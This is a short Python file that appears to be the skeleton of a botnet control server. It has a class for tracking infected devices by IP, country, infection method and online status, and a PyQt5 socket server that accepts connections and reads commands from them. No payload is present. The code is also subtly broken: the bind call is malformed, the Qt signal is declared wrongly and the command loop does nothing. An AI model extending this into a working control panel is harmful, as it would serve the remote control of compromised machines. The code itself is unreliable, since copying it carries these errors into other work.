import socket
from PyQt5.QtCore import QThread, pyqtSignal
import socket

class InfectedDevice:
    def __init__(self, method:str, name:str, ip:str, country:str, position:set, status:bool, last_online:str):
        self.method = method
        self.name = name
        self.ip = ip
        self.country = country
        self.status = status
        self.position = position
        self.last_online = last_online

class Handle(QThread):
    def __init__(self, socket:socket.socket):
        super().__init__()
        self.socket = socket
        self.finish_signal = pyqtSignal()

    def run(self):
        while True:
            cmd = self.socket.recv(1024).decode("utf-8")
    
    def on_disconnect(self):
        pass


class Server:
    def __init__(self):
        self.socket = socket.socket()

    def run(self, port:str):
        self.socket.bind("localhost", int(port))
        self.socket.listen(1)
        while True:
            sock, adr = self.socket.accept()
            handle = Handle(sock)
            handle.finished.connect(handle.on_disconnect)
            handle.start()
            
